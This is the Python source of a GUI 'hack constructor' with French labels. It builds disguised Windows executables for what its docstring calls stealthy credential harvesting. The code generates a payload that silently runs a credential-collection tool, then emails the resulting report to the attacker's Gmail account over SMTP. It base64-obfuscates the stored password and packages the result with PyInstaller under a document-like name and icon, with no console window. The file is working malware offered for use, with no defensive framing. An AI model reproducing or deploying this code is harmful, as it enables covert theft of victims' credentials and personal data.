#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SteelFox Builder - Hack Constructor
Creates custom executables for stealthy credential harvesting.
"""

import os
import sys
import subprocess
import tempfile
import shutil
from pathlib import Path
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from PIL import Image
import base64

# Add current directory to path for imports
sys.path.insert(0, os.path.dirname(__file__))

from steelfox.core.config import config

class HackBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("SteelFox Builder - Hack Constructor")
        self.root.geometry("500x600")
        self.root.configure(bg='#1a1a1a')
        
        # Style
        style = ttk.Style()
        style.configure('TLabel', background='#1a1a1a', foreground='#ffffff', font=('Arial', 10))
        style.configure('TButton', background='#333333', foreground='#ffffff', font=('Arial', 10))
        style.configure('TEntry', fieldbackground='#333333', foreground='#ffffff', font=('Arial', 10))
        style.configure('TCombobox', fieldbackground='#333333', foreground='#ffffff', font=('Arial', 10))
        
        self.create_widgets()
        
    def create_widgets(self):
        # Title
        title_label = tk.Label(self.root, text="SteelFox Hack Builder", font=('Arial', 16, 'bold'), bg='#1a1a1a', fg='#ffffff')
        title_label.pack(pady=20)
        
        # File Name
        tk.Label(self.root, text="Nom du fichier exécutable:", bg='#1a1a1a', fg='#ffffff').pack(anchor='w', padx=20)
        self.file_name_entry = tk.Entry(self.root, width=50, bg='#333333', fg='#ffffff', insertbackground='#ffffff')
        self.file_name_entry.insert(0, "rapport_document")
        self.file_name_entry.pack(padx=20, pady=5)
        
        # Icon Selection
        tk.Label(self.root, text="Icône du fichier:", bg='#1a1a1a', fg='#ffffff').pack(anchor='w', padx=20, pady=(10,0))
        
        # Frame for icon options
        icon_frame = tk.Frame(self.root, bg='#1a1a1a')
        icon_frame.pack(padx=20, pady=5, fill='x')
        
        # Predefined icons
        self.icon_var = tk.StringVar()
        self.icon_combo = ttk.Combobox(icon_frame, textvariable=self.icon_var, state='readonly', width=30)
        self.icon_combo['values'] = self.get_predefined_icons()
        self.icon_combo.current(0)
        self.icon_combo.pack(side='left')
        
        # Or custom icon
        tk.Button(icon_frame, text="Choisir image personnalisée", command=self.select_custom_icon, bg='#333333', fg='#ffffff').pack(side='right', padx=(10,0))
        
        self.custom_icon_path = None
        
        # Email
        tk.Label(self.root, text="Adresse e-mail Gmail:", bg='#1a1a1a', fg='#ffffff').pack(anchor='w', padx=20, pady=(10,0))
        self.email_entry = tk.Entry(self.root, width=50, bg='#333333', fg='#ffffff', insertbackground='#ffffff')
        self.email_entry.pack(padx=20, pady=5)
        
        # App Password
        tk.Label(self.root, text="Mot de passe d'application Google:", bg='#1a1a1a', fg='#ffffff').pack(anchor='w', padx=20, pady=(10,0))
        self.password_entry = tk.Entry(self.root, width=50, show='*', bg='#333333', fg='#ffffff', insertbackground='#ffffff')
        self.password_entry.pack(padx=20, pady=5)
        
        # Link to get app password
        link_label = tk.Label(self.root, text="Obtenir un mot de passe d'application", fg='#00aaff', bg='#1a1a1a', cursor='hand2', font=('Arial', 9, 'underline'))
        link_label.pack(pady=5)
        link_label.bind("<Button-1>", lambda e: self.open_app_password_link())
        
        # Build Button
        tk.Button(self.root, text="Construire l'exécutable", command=self.build_executable, bg='#333333', fg='#ffffff').pack(pady=30)
        
        # Status
        self.status_label = tk.Label(self.root, text="", bg='#1a1a1a', fg='#ffffff')
        self.status_label.pack(pady=10)
        
    def get_predefined_icons(self):
        assets_dir = Path(__file__).parent / 'steelfox' / 'assets'
        icons = []
        for file in assets_dir.glob('*.ico'):
            icons.append(file.stem)
        return icons
    
    def select_custom_icon(self):
        file_path = filedialog.askopenfilename(filetypes=[("Images", "*.png *.jpg *.jpeg *.bmp")])
        if file_path:
            self.custom_icon_path = file_path
            self.icon_var.set("Image personnalisée sélectionnée")
    
    def open_app_password_link(self):
        import webbrowser
        webbrowser.open("https://support.google.com/accounts/answer/185833")
    
    def build_executable(self):
        file_name = self.file_name_entry.get().strip()
        email = self.email_entry.get().strip()
        password = self.password_entry.get().strip()
        
        if not file_name:
            messagebox.showerror("Erreur", "Veuillez entrer un nom de fichier.")
            return
        if not email or not password:
            messagebox.showerror("Erreur", "Veuillez entrer l'e-mail et le mot de passe d'application.")
            return
        
        self.status_label.config(text="Construction en cours...")
        self.root.update()
        
        try:
            # Create temp directory
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                
                # Create the hack script
                hack_script = self.create_hack_script(email, password)
                script_path = temp_path / 'hack_script.py'
                script_path.write_text(hack_script, encoding='utf-8')
                
                # Copy steelfox files
                self.copy_steelfox_files(temp_path)
                
                # Determine icon
                icon_path = self.get_icon_path()
                
                # Build executable with PyInstaller
                self.build_with_pyinstaller(script_path, temp_path, file_name, icon_path)
                
                # Move the executable to current directory
                exe_name = f"{file_name}.exe"
                exe_path = temp_path / 'dist' / exe_name
                if exe_path.exists():
                    shutil.move(str(exe_path), exe_name)
                    self.status_label.config(text=f"Exécutable créé : {exe_name}")
                    messagebox.showinfo("Succès", f"Exécutable '{exe_name}' créé avec succès !")
                else:
                    raise Exception("Échec de la création de l'exécutable")
                    
        except Exception as e:
            self.status_label.config(text="Erreur lors de la construction")
            messagebox.showerror("Erreur", f"Erreur : {str(e)}")
    
    def create_hack_script(self, email, password):
        # Encode password in base64 for basic obfuscation
        encoded_password = base64.b64encode(password.encode()).decode()
        
        script = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Custom SteelFox Hack Executable
"""

import os
import sys
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import base64
import subprocess
import tempfile

def send_email_with_attachment(email, password, attachment_path):
    try:
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = "SteelFox Report"
        
        body = "Rapport SteelFox en pièce jointe."
        msg.attach(MIMEText(body, 'plain'))
        
        with open(attachment_path, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(attachment_path)}")
            msg.attach(part)
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        return False

def main():
    # Decode password
    password = base64.b64decode("{encoded_password}").decode()
    
    # Run SteelFox in stealth mode
    with tempfile.TemporaryDirectory() as temp_dir:
        report_path = os.path.join(temp_dir, "report.html")
        
        # Run steelfox.py with stealth
        cmd = [sys.executable, "steelfox.py", "all", "-oH", "-output", temp_dir, "-s"]
        subprocess.run(cmd, cwd=os.path.dirname(__file__))
        
        # Find the HTML report
        for file in os.listdir(temp_dir):
            if file.endswith('.html'):
                report_path = os.path.join(temp_dir, file)
                break
        
        # Send email
        if os.path.exists(report_path):
            if send_email_with_attachment("{email}", password, report_path):
                pass  # Success, silent
            else:
                pass  # Failed, silent in stealth mode

if __name__ == "__main__":
    main()
'''.format(encoded_password=encoded_password, email=email)
        return script
    
    def copy_steelfox_files(self, temp_path):
        # Copy the entire steelfox directory
        src = Path(__file__).parent / 'steelfox'
        dst = temp_path / 'steelfox'
        shutil.copytree(src, dst)
        
        # Copy steelfox.py
        shutil.copy('steelfox.py', temp_path)
    
    def get_icon_path(self):
        if self.custom_icon_path:
            # Convert to ico if needed
            img = Image.open(self.custom_icon_path)
            img = img.resize((256, 256), Image.LANCZOS)
            icon_path = Path(self.custom_icon_path).with_suffix('.ico')
            img.save(str(icon_path), format='ICO')
            return str(icon_path)
        else:
            assets_dir = Path(__file__).parent / 'steelfox' / 'assets'
            icon_name = self.icon_var.get() + '.ico'
            return str(assets_dir / icon_name)
    
    def build_with_pyinstaller(self, script_path, temp_path, file_name, icon_path):
        cmd = [
            sys.executable, '-m', 'PyInstaller',
            '--onefile',
            '--windowed',  # No console
            '--name', file_name,
            '--icon', icon_path,
            str(script_path)
        ]
        subprocess.run(cmd, cwd=temp_path, check=True)

if __name__ == "__main__":
    root = tk.Tk()
    app = HackBuilder(root)
    root.mainloop()